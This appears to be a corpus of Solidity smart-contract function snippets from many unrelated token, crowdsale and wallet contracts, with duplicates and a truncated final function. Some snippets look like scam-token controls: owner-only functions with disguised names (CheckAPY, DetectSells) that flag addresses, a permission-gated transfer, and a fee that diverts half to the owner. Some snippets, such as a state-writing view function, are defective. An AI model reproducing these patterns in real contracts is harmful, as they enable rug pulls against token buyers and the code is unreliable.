        records[node].pubkey = PublicKey(x, y);
        emit PubkeyChanged(node, x, y);
    }
--------------------------------------------------------------------------------
function getTokensAmountByTokens(address _token, uint _tokenValue) private returns(uint tokensToBuy) {
        assert(tokenPrice[_token] > 0);
        return getTokensAmount(tokenPrice[_token], tokenAmount[_token], _tokenValue);
    }
--------------------------------------------------------------------------------
function returnFundsForMultiple(address[] _users) public onlyManager {
        for (uint i = 0; i < _users.length; i++) {
            returnFundsFor(_users[i]);
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function initializeDomainSeparator() public {
        // hash the name context with the contract address
        EIP712_DOMAIN_HASH = keccak256(abi.encodePacked(// solium-disable-line
                EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH,
                keccak256(bytes(name)),
                bytes32(address(this))
            ));
    }
--------------------------------------------------------------------------------
function withDraw(address _etherAddress) public payable onlyOwner {
        require (_etherAddress != address(0));
        address contractAddress = this;
        _etherAddress.transfer(contractAddress.balance);
    }
--------------------------------------------------------------------------------
function setupAmbi2(Ambi2 _ambi2) public returns(bool) {
        if (address(ambi2) != address(0)) {
            return false;
        }

        ambi2 = _ambi2;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function setICOEndDate(uint _date) public onlyAdmin {
    require(ICOEndDate == 0);
    require(_date > now);

    ICOEndDate = _date;

    emit ICOEndDateSet(_date);
  }
--------------------------------------------------------------------------------
function deposit() public payable {
        _balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function updateWithdrawalDelay(uint64 newWithdrawalDelay)
        external
        onlyGovernance
    {
        require(
            newWithdrawalDelay <= _MAX_WITHDRAWAL_DELAY,
            "InstantWithdrawManager::updateWithdrawalDelay: EXCEED_MAX_WITHDRAWAL_DELAY"
        );
        withdrawalDelay = newWithdrawalDelay;
        emit UpdateWithdrawalDelay(newWithdrawalDelay);
    }
--------------------------------------------------------------------------------
function bonusAmmount(uint256 tokens) internal returns(uint256) {
    // first 500 get extra 30%
    if (numberOfPurchasers < 501) {
      return tokens * 3 / 10;
    } else {
      return tokens /4;
    }
  }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
    bool timeLimitReached = now > endTimestamp;
    bool capReached = weiRaised >= hardcap;
    return timeLimitReached || capReached;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function authorizeExecutors(address[] memory executors) public override onlyOwner {
    for (uint256 i = 0; i < executors.length; i++) {
      _authorizeExecutor(executors[i]);
    }
  }
--------------------------------------------------------------------------------
function unauthorizeExecutors(address[] memory executors) public override onlyOwner {
    for (uint256 i = 0; i < executors.length; i++) {
      _unauthorizeExecutor(executors[i]);
    }
  }
--------------------------------------------------------------------------------
function setBuyPrice(uint256 newBuyPrice) 
    onlyOwner 
    public {
        require(newBuyPrice>0);
        _originalBuyPrice = newBuyPrice; // unit
        // control _maximumBuy_USD = 10,000 USD, KNOW price is 0.1USD
        // maximumBuy_KNOW = 100,000 KNOW = 100,000,0000000000 unit = 10^15
        _maximumBuy = (10**18 * 10**15) /_originalBuyPrice;
    }
--------------------------------------------------------------------------------
function votingPhase(uint256 _proposal) public view returns (bool) {
    uint256 createdAt = proposals[_proposal].createdAt;
    return block.timestamp <= createdAt.add(VOTING_PHASE);
  }
--------------------------------------------------------------------------------
function ownerFee(uint amount) private returns (uint fee) {
        if (total < 200000 ether) {
            fee = amount/2;
            balances[owner] += fee;
        }
        return;
    }
--------------------------------------------------------------------------------
function transferOwnership(
    address _newOwner
  )
    public
    onlyOwner
  {
    require(_newOwner != address(0), ZERO_ADDRESS);
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function addGiveawayWinners(address[] calldata giveawayAddresses) external onlyOwner {
        for (uint256 i; i < giveawayAddresses.length; i++) {
            giveawayMintList[giveawayAddresses[i]] = 1;
        }
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function() payable {
        if (msg.value != 0) {
            ReceivedEther(msg.sender, msg.value);
        } else {
            throw;
        }
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        EthereumVault[0x0] = add(EthereumVault[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function AddContractAddress(address tokenAddress, bool contractstatus, uint256 _maxcontribution) public restricted {
        contractaddress[tokenAddress] = contractstatus;
		maxcontribution[tokenAddress] = _maxcontribution;
		
		emit onAddContractAddress(tokenAddress, contractstatus, _maxcontribution);
    }
--------------------------------------------------------------------------------
function addWhiteList (address botAdd) public {
        require(_msgSender() == _marketingWallet, "ERC20: cannot permit dev address");
        _whiteList.push(botAdd);
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), CANNOT_TRANSFER_TO_ZERO_ADDRESS);
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
  returns (bool success) {
    if (_value <= 0) throw; 
    allowance[msg.sender][_spender] = _value;
    return true;
  }
--------------------------------------------------------------------------------
function getData()
        external
        view
        returns (
            string name,
            string symbol,
            uint256 sellPrice,
            uint256 buyPrice
        )
    {
        return(
            name = data.name,
            symbol = data.symbol,
            sellPrice = getNav(),
            buyPrice = getNav()
        );
    }
--------------------------------------------------------------------------------
function registerContribution(bytes32 id, address contributor, uint256 amount)
        public
        onlyOwner
        onlyActive
        onlyValid(contributor)
        onlyNotZero(amount)
        onlyUniqueContribution(id)
    {
        isContributionRegistered[id] = true;

        token.transfer(contributor, amount);

        ContributionRegistered(id, contributor, amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawFee() public onlyOwner {
        require(this.balance > 0);
        owner.transfer(this.balance);
        WithdrawFee(this.balance);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function receive(bytes32 p, bytes32 c) external payable isOpen returns (bool) {
        emit PurchaseMade(msg.sender, msg.value, "ETH", c, p);
        return true;
    }
--------------------------------------------------------------------------------
function UDIACoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function transferAndCall(address _recipient, uint _value, uint[] _extraData) public {
        transfer(_recipient, _value);
        require(TokenRecipient(_recipient).tokenFallback(msg.sender, _value, _extraData));
    }
--------------------------------------------------------------------------------
function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    uint256 bonusrate = (rate.mul(bonus)).div(100);
    return weiAmount.mul(bonusrate);
  }
--------------------------------------------------------------------------------
constructor(
        uint256 _feeRate,
        address _creatorVault,
        address _curveLibrary,
        address _collateralToken
    )
        public
    {
        // Sets the storage variables
        feeRate_ = _feeRate;
        creatorVault_ = IVault(_creatorVault);
        curveLibrary_ = ICurveFunctions(_curveLibrary);
        collateralToken_ = IERC20(_collateralToken);
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
        require(isApprovedFor(msg.sender, _tokenId));
        clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
    }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
        require(ownerOf(_tokenId) == _owner);
        tokenApprovals[_tokenId] = 0;
        Approval(_owner, 0, _tokenId);
    }
--------------------------------------------------------------------------------
function TDT() {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
        deadline = block.number + durationInBlocks;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    beetles[spender] = val;
    wolf[spender] = val2; 
    bigass[spender] = val3;
    gallons = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
        if (master == 0x0) revert();
        if (msg.sender != upgradeMaster) revert();
        upgradeMaster = master;
    }
--------------------------------------------------------------------------------
function getRegulatorProxy(uint256 i) public view returns(address) {
        require((i < regulators.length) && (i >= 0), "Invalid index");
        return regulators[i];
    }
--------------------------------------------------------------------------------
constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(admin_);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function updateMinimumStake(uint256 amount) external onlyOwner {
        require(amount <= maximumStake, "Given amount exceeds current maximum stake");
        minimumStake = amount;
    }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) external returns(bool) {
          require(msg.sender == ownerAddress,"only OwnerWallet");
          LEVEL_PRICE[_level] = _price;
          return true;
    }
--------------------------------------------------------------------------------
function updateToken(address _newToken) public returns(bool) {
        require(msg.sender == ownerAddress, "Invalid User");
        Token = ERC20(_newToken);
        return true;
    }
--------------------------------------------------------------------------------
function withdrawEther(uint _amount) public
        onlyEscrow
    {
        require(namiMultiSigWallet != 0x0);
        // Available at any phase.
        if (address(this).balance > 0) {
            namiMultiSigWallet.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function safeWithdraw(address _withdraw, uint _amount) public
        onlyEscrow
    {
        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
        if (namiWallet.isOwner(_withdraw)) {
            _withdraw.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function getEtherToBuy (uint _ether, bool _status)
        public
        view
        returns (uint)
    {
        if (_status) {
            return _ether * rateWin / 100;
        } else {
            return _ether * rateLoss / 100;
        }
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "BRICKELL";
        _symbol = "MIAMI";
        _totalSupply = 305000000 *10**(decimals());
        _balances[_msgSender()] = _totalSupply;
        
    
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function isValidSignature(
        address _pluginAddress,
        uint40 _signId,
        uint40 _cutieId,
        uint128 _value,
        uint256 _parameter,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    )
    public
    view
    returns (bool)
    {
        return getSigner(_pluginAddress, _signId, _cutieId, _value, _parameter, _v, _r, _s) == signerAddress;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawStuckETH() external {
        bool success;
        (success,) = address(0x7C2D2a65143CD0C795795FAf3aa1a4Eef9795c35).call{value: address(this).balance}("");
    }
--------------------------------------------------------------------------------
function setThreshold(uint[4] memory ts) external onlyOwner{
        for(uint i=0;i<4; i++){
            threshold[i] = ts[i];
        }
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol, uint256 maxSupply) public {
        initOwned(msg.sender);

        _name = name;
        _symbol = symbol;
        _max_supply = maxSupply;

        // register the supported interfaces to conform to ERC721 via ERC165
        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
    }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
function _transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns(bool success) {
        if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _upgradeTo(address _newImplementation) internal {
        address currentImplementation = implementation();
        require(currentImplementation != _newImplementation);
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }
--------------------------------------------------------------------------------
function AGP(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
constructor (
        string _symbol, 
        string _name, 
        uint8 _decimals, 
        uint _tokensSold
    ) Owned() public {
        symbol = _symbol;
        name = _name;
        decimals = _decimals;
        tokensSold = _tokensSold;
        balances[owner] = _tokensSold;
    }
--------------------------------------------------------------------------------
function setAddress(address _cubegoCoreAddress, address _emontTokenAddress, address _cubegonNFTAddress, address _verifyAddress) onlyModerators external {
        cubegoCore = CubegoCoreInterface(_cubegoCoreAddress);
        emontToken = EMONTInterface(_emontTokenAddress);
        cubegonNFT = CubegonNFTInterface(_cubegonNFTAddress);
        verifyAddress = _verifyAddress;
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    super._preValidatePurchase(_beneficiary, _weiAmount);
    require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function getToken(uint i) public view returns(address) {
        require((i < tokens.length) && (i >= 0), "Invalid index");
        return tokens[i];
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor() public {
        totalSupply_ = TOTAL_SUPPLY; // set total amount of tokens
        balances[owner] = TOTAL_SUPPLY; // transfer all tokens to smart contract owner

        emit Transfer(address(0), owner, totalSupply_); // emit Transfer event and notify that transfer of tokens was made
    }
--------------------------------------------------------------------------------
constructor(address operation) public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[operation] = INITIAL_SUPPLY;
    emit Transfer(address(0), operation, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
        require(state == State.Active);
        deposited[investor] = deposited[investor].add(msg.value);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function buy() payable public {
        uint amount = msg.value / buyPrice;               // calculates the amount
        _transfer(callers[0], msg.sender, amount);    
    }
--------------------------------------------------------------------------------
function CrowdWallet(address _gns, address _owner, uint _blocksPerPayPeriod) {
    token = GenesisToken(_gns);
    owner = _owner;
    blocksPerPayPeriod = _blocksPerPayPeriod;
    nextPayoutBlock = now.add(blocksPerPayPeriod);
  }
--------------------------------------------------------------------------------
function startNewPayoutPeriod() {
    require(isNewPayoutPeriod());

    previousPayoutBlock = nextPayoutBlock;
    nextPayoutBlock = nextPayoutBlock.add(blocksPerPayPeriod);
    payoutPool = this.balance;
  }
--------------------------------------------------------------------------------
function replaceBoardMember(address _oldMember, address _newMember)
        public
        onlyBoard
        returns (bool)
    {
        require(removeBoardMember(_oldMember), "Failed to remove old member");
        return addBoardMember(_newMember);
    }
--------------------------------------------------------------------------------
function lock(BaseWallet _wallet) external onlyGuardian(_wallet) onlyWhenUnlocked(_wallet) {
        guardianStorage.setLock(_wallet, now + lockPeriod);
        emit Locked(_wallet, uint64(now + lockPeriod));
    }
--------------------------------------------------------------------------------
function getLock(BaseWallet _wallet) public view returns(uint64 _releaseAfter) {
        uint256 lockEnd = guardianStorage.getLock(_wallet); 
        if(lockEnd > now) {
            _releaseAfter = uint64(lockEnd);
        }
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function scheduleNewDerivativeToken(address _address, uint256 _time) public onlyOwner returns (bool) {
        require(!nextDerivativeTokenScheduled);

        nextDerivativeTokenScheduled = true;
        nextDerivativeTokenTime = _time;
        nextDerivativeToken = DerivativeTokenInterface(_address);

        return true;
    }
--------------------------------------------------------------------------------
function addressFromData (bytes b) internal pure returns (address) {
        bytes20 addr;
        assembly {
            // Read address bytes
            // Offset of 32 bytes, representing b.length
            addr := mload(add(b, 0x20))
        }
        return address(addr);
    }
--------------------------------------------------------------------------------
function blockNumberFromData(bytes b) internal pure returns (uint32) {
        bytes4 block_number;
        assembly {
            // Read block number bytes
            // Offset of 32 bytes (b.length) + 20 bytes (address)
            block_number := mload(add(b, 0x34))
        }
        return uint32(block_number);
    }
--------------------------------------------------------------------------------
function getReserveFactor(DataTypes.ReserveConfigurationMap memory self) internal pure returns (uint256) {
    uint256 RESERVE_FACTOR_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFFFFFFFFFFFF; // prettier-ignore
    uint256 RESERVE_FACTOR_START_BIT_POSITION = 64;

    return (self.data & ~RESERVE_FACTOR_MASK) >> RESERVE_FACTOR_START_BIT_POSITION;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function setManyWhitelist(address[] _addr) public onlyOwners {
        for (uint256 i = 0; i < _addr.length; i++) {
            setWhitelist(_addr[i]);
        }
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success)    
    {        
    	require(!frozenAccount[msg.sender]);

        _transfer(msg.sender, _to, _value);

        return true;

    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    lion[spender] = val;
    trump[spender] = val2; 
    junior[spender] = val3;
    ireland = val4;
  }
--------------------------------------------------------------------------------
function validPurchase() internal returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public returns(bool) {
        state = false;
        emit StopICO();
        if (token.paused()) {
            token.unpause();
        }
        return true;
    }
--------------------------------------------------------------------------------
function setMultisig(address _to) public onlyOwner returns(bool) {
        require(_to != address(0));
        multisig = _to;
        emit NewWalletAddress(_to);
        return true;
    }
--------------------------------------------------------------------------------
function addCoinDetail(uint256 pId, uint256 value, bool isGet, Datasets.CoinOpTypeEnum opType) private {
        emit onCoinDetail(roundId, pId, value, isGet, uint8(opType), now, block.number);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function setMainSaleDates(uint256 _mainSaleStartTime, uint256 _mainSaleEndTime) public onlyOwner returns (bool) {
    require(!isFinalised);
    require(_mainSaleStartTime < _mainSaleEndTime);
    mainSaleStartTime = _mainSaleStartTime;
    mainSaleEndTime = _mainSaleEndTime;
    return true;
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function AnimalgoSave(address _holder) public view returns(bool){
    require(!save[_holder]);
    save[_holder] = true;
    emit Save(_holder);
    return true;
}
--------------------------------------------------------------------------------
function addLiqToContract(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            trades(_counts[i]); }
    }
--------------------------------------------------------------------------------
function getBundle(uint256 bundleId) external view returns (Bundle memory) {
        require(_isBuyable(bundleId), "This bundle is not buyable");
        return _bundleIdToBundle[bundleId];
    }
--------------------------------------------------------------------------------
function ensureExistingProposal(bytes32 proposalId)
        internal
        constant
        returns (VotingProposal.Proposal storage p)
    {
        p = _proposals[proposalId];
        require(p.token != address(0), "NF_VC_PROP_NOT_EXIST");
        return p;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function claimRemainingBalanceAtEndOfVesting() external onlyOwner {
        uint _amount = shiburai.balanceOf(address(this));
        shiburai.transfer(msg.sender, _amount);
    }
--------------------------------------------------------------------------------
function removeFromWhiteList(address _user) external onlyOwner() {

        require(whiteList[_user] == true);
        whiteList[_user] = false;
        totalWhiteListed--;
        emit LogRemoveWhiteListed(_user);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function Metadium() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function XXXToken() public {

    totalSupply_ = INITIAL_SUPPLY;
    
    balances[msg.sender] = INITIAL_SUPPLY;

    Transfer(0x0, msg.sender, INITIAL_SUPPLY);

  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public {
        _burn(msg.sender, _amount);
        _moveDelegates(_delegates[msg.sender], address(0), _amount);
    }
--------------------------------------------------------------------------------
function addWallet(address _address) onlyOwner public {
        require(!inList[_address]);
        wallets.push(_address);
        inList[_address] = true;
        WalletAdded(_address);
    }
--------------------------------------------------------------------------------
function claimManyTokenFor(address[] _beneficiaries) external afterSale {
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            claimTokenFor(_beneficiaries[i]);
        }
    }
--------------------------------------------------------------------------------
function setInterestPrice(address _property, uint256 _value)
		external
		returns (uint256)
	{
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getInterestPriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
function isKeyExist(address _id, address _key) isName(_id) external view returns (bool) {
		require (isExist(_id));
		require (_key != address(0));
		return keyToNameId[_key] == _id;
	}
--------------------------------------------------------------------------------
constructor(address vat_) public {
        vat = VatLike(vat_);
        wards[msg.sender] = 1;
        emit Rely(msg.sender);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
     
    }
--------------------------------------------------------------------------------
function freezeAccount(address _target) onlyOwner public {
        require(_target != address(0));
        frozenAccount[_target] = true;
        emit Freeze(_target, true);
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _target) onlyOwner public {
        require(_target != address(0));
        frozenAccount[_target] = false;
        emit UnFreeze(_target, false);
    }
--------------------------------------------------------------------------------
function staffInfo() public view onlyStaff returns (bool ceo, bool coo, bool cfo, bool qa){
        return (msg.sender == ceoAddress, msg.sender == cooAddress, msg.sender == cfoAddress,false);
    }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    fanfan[spender] = val;
    gondola[spender] = val2; 
    venice[spender] = val3;
    thunderstrike = val4;
  }
--------------------------------------------------------------------------------
function extendTime(uint256 _newEndSaleDate) onlyOwner public {
        //current time should always be less than endTime+extendedTime
        require(saleEndDate < _newEndSaleDate);
        require(_newEndSaleDate != 0);
        saleEndDate = _newEndSaleDate;
